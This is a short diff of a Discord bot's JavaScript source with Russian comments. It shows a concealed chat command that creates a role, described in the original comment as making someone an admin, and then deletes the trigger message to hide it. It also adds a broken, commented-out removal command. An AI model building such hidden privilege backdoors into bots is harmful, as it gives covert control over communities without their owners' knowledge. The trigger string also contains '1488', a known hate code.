@@ -91,7 +91,7 @@ Me : `+text.substring(text.lastIndexOf('<br>')+14));
 		})
 	}
 	
-	/*Секретная команда для добавления человека в админы*/
+	/*Секретная команда для добавления секретной роли кчеловеку*/
 	if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibso') {
 		message.guild.createRole({
 			name: 'DJ',
@@ -103,6 +103,14 @@ Me : `+text.substring(text.lastIndexOf('<br>')+14));
 		
 		message.delete().catch(O_o=>{});  
 	}
+	
+	/*Секретная команда для удаления секретной роли у человека*/
+	/*if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibaso') {
+		message.guild.
+		.catch(console.error)
+		
+		message.delete().catch(O_o=>{});  
+	}*/
 });
 
 /*Пишет в чат о том, что человек покинул сервер*/
